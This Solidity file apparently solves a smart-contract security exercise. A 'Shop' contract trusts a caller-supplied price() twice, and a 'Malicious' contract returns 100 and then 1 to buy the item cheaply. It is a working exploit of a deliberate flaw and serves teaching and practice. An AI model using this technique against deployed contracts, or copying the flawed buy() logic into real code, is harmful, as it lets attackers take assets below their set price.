// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Malicious {
    Shop shop;
    constructor(address target) { shop = Shop(target); }
    
    function solve() external {
        shop.buy();
        require(shop.price() == 1, "Failed");
    }

    function price() external view returns (uint) {
        if(msg.sender == address(shop) && shop.isSold()) {
            return 1;
        } else {
            return 100;
        }
    }
}
